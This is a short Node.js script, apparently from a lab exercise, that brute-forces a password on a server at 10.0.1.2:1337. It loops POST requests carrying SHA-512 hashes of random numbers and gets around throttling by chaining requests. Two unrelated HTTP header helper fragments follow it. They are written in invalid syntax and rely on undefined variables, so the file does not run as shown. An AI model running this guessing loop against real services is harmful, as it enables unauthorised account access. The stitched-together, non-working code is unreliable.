"use strict";

var http = require('http');
var querystring = require('querystring');
var crypto = require('crypto');

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

// function to do brute force password attack;
function createRequest() {
  // createHash must be called for each update();
  var sha512 = crypto.createHash('sha512');
  sha512.update(getRandomInt(0, 2000).toString());
  var postData = querystring.stringify({
    'password' : sha512.digest('hex'),
    'video' : "https://www.youtube.com/watch?v=kx3Kzjg77RU"
  });   // video to play when password is hacked;

  var options = {
    hostname: '10.0.1.2',
    port: 1337,
    method: 'POST',
    headers: {}
  };

  var req = http.request(options, function(res) {
    //console.log('STATUS: ' + res.statusCode);
    res.setEncoding('utf8');
    res.on('end', function() {
      createRequest();
    });     // MUST call within 'end' event handler since server throttles requests;
  });

  req.on('error', function(e) {
    console.log('problem with request: ' + e.message);
  });

  // write data to request body
  req.write(postData);
  req.end();
}

createRequest();    // start 1st request;


// to parse the request's message head:
parseHeaders() {
  var messageHead = data.toString().split('\n');
  var statusLine = messageHead.shift().split(' ');
  var headers = messageHead.reduce(function(obj, cur) {
    var boots = cur.split(': ');      // ie: Host: localhost:8080
    var key = boots.shift();
    var value = boots.join();
    obj[key] = value;
    return obj;
  }, {});   // must pass the initial empty object;
}

// to create the response's message head:
createHeaders() {
  var responseHeader = 'HTTP/1.1 ' + statusCode + ' ' + statusPhrase;
  responseHeader += Object.keys(headers).reduce(function (str, key) {
    return str + key + ': ' + headers[key] + '\n';
  }, '');
  responseHeader += '\n';
  // IMPORTANT: an empty line MUST be between message's head and body;
  socket.write(responseHeader);
  socket.end(body);
}